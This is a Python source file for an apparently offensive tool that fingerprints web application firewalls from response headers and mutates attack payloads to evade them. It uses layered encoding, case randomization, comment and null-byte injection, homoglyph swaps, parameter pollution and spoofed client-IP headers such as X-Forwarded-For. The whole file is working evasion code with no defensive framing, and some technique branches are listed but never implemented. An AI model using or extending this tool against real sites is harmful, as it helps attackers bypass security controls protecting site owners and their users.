#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random
import base64
import urllib.parse
from typing import Dict, List, Optional
from dataclasses import dataclass
import logging

logger = logging.getLogger(__name__)

@dataclass
class EvasionTechnique:
    name: str
    priority: int
    success_rate: float

class SmartWAFEvader:
    
    def __init__(self):
        self.techniques = [
            EvasionTechnique("multi_layer_encoding", 1, 0.85),
            EvasionTechnique("parameter_pollution", 2, 0.75),
            EvasionTechnique("header_smuggling", 3, 0.70),
            EvasionTechnique("case_randomization", 4, 0.60),
            EvasionTechnique("comment_injection", 5, 0.65),
            EvasionTechnique("unicode_normalization", 6, 0.80),
            EvasionTechnique("null_byte_injection", 7, 0.55),
        ]
        
        self.waf_signatures = {
            'cloudflare': ['cf-ray', 'cf-cache-status', '__cfduid'],
            'aws_waf': ['x-amz-cf-id', 'aws-waf-token'],
            'modsecurity': ['modsecurity', 'modsec'],
            'akamai': ['x-akamai', 'x-true-cache-key'],
            'imperva': ['x-iinfo', 'incap_ses']
        }
        
        self.detected_waf = None
        self.successful_techniques = []
    
    async def detect_waf(self, response_headers: Dict) -> Optional[str]:

        for waf, signatures in self.waf_signatures.items():
            for header in response_headers:
                if any(sig in header.lower() for sig in signatures):
                    self.detected_waf = waf
                    logger.info(f"✅ تم كشف WAF: {waf.upper()}")
                    return waf
        return None
    
    def apply_multi_layer_encoding(self, payload: str) -> str:

        # الطبقة 1: URL Encoding
        layer1 = urllib.parse.quote(payload, safe='')
        
        # الطبقة 2: Base64
        layer2 = base64.b64encode(layer1.encode()).decode()
        
        # الطبقة 3: Double URL Encoding
        layer3 = urllib.parse.quote(layer2, safe='')
        
        # الطبقة 4: Unicode
        layer4 = ''.join([f'%u{ord(c):04x}' if random.random() > 0.5 else c for c in layer3])
        
        return layer4
    
    def apply_parameter_pollution(self, params: Dict) -> List[Dict]:

        polluted_params = []
        
        techniques = [

            lambda p: {**p, **{k + '_copy': v for k, v in p.items()}},
            
            lambda p: dict(reversed(list(p.items()))),
            
            lambda p: {**p, **{f'empty_{i}': '' for i in range(3)}},
            
            lambda p: {**p, **{f'param_{random.randint(1000,9999)}': 'test'}},
        ]
        
        for tech in techniques:
            polluted_params.append(tech(params))
        
        return polluted_params
    
    def apply_header_smuggling(self, headers: Dict) -> Dict:

        smuggled_headers = headers.copy()
        
        fake_headers = {
            'X-Forwarded-For': f'192.168.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Real-IP': f'10.0.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Client-IP': f'172.16.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Originating-IP': f'203.0.113.{random.randint(1,255)}',
            'X-Remote-IP': f'198.51.100.{random.randint(1,255)}',
            'X-Remote-Addr': f'192.0.2.{random.randint(1,255)}',
            'X-Host': 'localhost',
            'X-Http-Method-Override': 'GET',
            'X-Request-ID': str(random.randint(1000000, 9999999)),
            'X-Correlation-ID': str(random.randint(1000000, 9999999)),
        }
        
        selected_fakes = random.sample(list(fake_headers.items()), random.randint(3, 5))
        for key, value in selected_fakes:
            smuggled_headers[key] = value
        
        return smuggled_headers
    
    def randomize_case(self, payload: str) -> str:

        result = []
        for char in payload:
            if char.isalpha():
                if random.random() > 0.5:
                    result.append(char.upper() if char.islower() else char.lower())
                else:
                    result.append(char)
            else:
                result.append(char)
        return ''.join(result)
    
    def inject_comments(self, payload: str) -> str:

        comment_types = [
            '/*', '*/',
            '--',
            '#',
            '//',
            '<!--', '-->'
        ]
        
        if len(payload) > 10:
            split_point = random.randint(3, len(payload)-3)
            comment = random.choice(comment_types)
            
            if comment in ['/*', '<!--']:

                return payload[:split_point] + comment + 'random' + ('*/' if comment == '/*' else '-->') + payload[split_point:]
            else:

                return payload[:split_point] + comment + ' random' + payload[split_point:]
        
        return payload
    
    async def evade_payload(self, original_payload: str, waf_type: str = None) -> List[str]:

        evaded_payloads = []
        
        if waf_type == 'cloudflare':
            techniques = ['multi_layer_encoding', 'unicode_normalization', 'header_smuggling']
        elif waf_type == 'aws_waf':
            techniques = ['parameter_pollution', 'case_randomization', 'comment_injection']
        elif waf_type == 'modsecurity':
            techniques = ['multi_layer_encoding', 'null_byte_injection', 'unicode_normalization']
        else:
            techniques = [t.name for t in self.techniques]
        
        for technique_name in techniques:
            try:
                if technique_name == 'multi_layer_encoding':
                    payload = self.apply_multi_layer_encoding(original_payload)
                elif technique_name == 'case_randomization':
                    payload = self.randomize_case(original_payload)
                elif technique_name == 'comment_injection':
                    payload = self.inject_comments(original_payload)
                elif technique_name == 'unicode_normalization':
                    payload = self.normalize_unicode(original_payload)
                elif technique_name == 'null_byte_injection':
                    payload = self.inject_null_bytes(original_payload)
                else:
                    continue
                
                evaded_payloads.append(payload)
                logger.debug(f"تم إنشاء بايلود بتقنية {technique_name}")
                
            except Exception as e:
                logger.error(f"خطأ في تقنية {technique_name}: {e}")
        
        evaded_payloads.append(original_payload)
        
        return list(set(evaded_payloads))  # إزالة التكرارات
    
    def normalize_unicode(self, payload: str) -> str:

        unicode_variations = {
            'a': ['a', 'а', 'ɑ', 'ａ'],
            's': ['s', 'ѕ', 'ｓ'],
            'l': ['l', 'ｌ', '1', 'Ⅰ'],
            'o': ['o', 'о', 'ο', 'ｏ', '0'],
            '<': ['<', '＜', '⟨'],
            '>': ['>', '＞', '⟩'],
            '"': ['"', '＂', '″'],
            "'": ["'", '＇', '′'],
        }
        
        result = []
        for char in payload:
            if char.lower() in unicode_variations:
                variations = unicode_variations[char.lower()]
                result.append(random.choice(variations))
            else:
                result.append(char)
        
        return ''.join(result)
    
    def inject_null_bytes(self, payload: str) -> str:
    
        null_bytes = ['%00', '%2500', '\\x00', '\\0', '\\\\0']
        
        if len(payload) > 5:
            positions = random.sample(range(len(payload)), min(3, len(payload)//2))
            result = list(payload)
            
            for pos in sorted(positions, reverse=True):
                null_byte = random.choice(null_bytes)
                result.insert(pos, null_byte)
            
            return ''.join(result)
        
        return payload
    
    async def create_evasive_request(self, url: str, method: str = "GET", params: Dict = None, headers: Dict = None) -> List[Dict]:
    
        requests = []
        

        for i in range(3):  # 3 متغيرات مختلفة
            request_data = {
                'url': url,
                'method': method,
                'params': params.copy() if params else {},
                'headers': headers.copy() if headers else {},
                'evasion_level': i + 1
            }
            
            if params:
                polluted = self.apply_parameter_pollution(params)
                request_data['params'] = random.choice(polluted)
            
            if headers:
                request_data['headers'] = self.apply_header_smuggling(headers)
            
            request_data['delay'] = random.uniform(0.1, 2.0)
            
            requests.append(request_data)
        
        return requests
